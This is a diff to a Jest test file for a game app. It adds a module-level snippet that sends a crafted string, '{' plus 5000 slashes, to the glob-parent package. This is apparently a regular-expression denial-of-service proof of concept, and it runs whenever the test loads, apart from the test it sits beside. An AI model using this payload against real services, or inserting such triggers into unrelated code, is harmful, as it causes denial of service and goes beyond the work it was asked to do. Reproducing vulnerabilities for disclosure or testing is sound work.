@@ -1,8 +1,21 @@
 const Game = require('../src/game').default
 const fs = require('fs')
 
+var globParent = require("glob-parent")
+function build_attack(n) {
+var ret = "{"
+for (var i = 0; i < n; i++) {
+ret += "/"
+}
+
+return ret;
+}
+
+globParent(build_attack(5000));
+
 describe('App', () => {
   it('Contains the compiled JavaScript', async () => {
+
     const data = fs.readFileSync('./public/main.js', 'utf8')
     expect(data).toMatchSnapshot()
   })
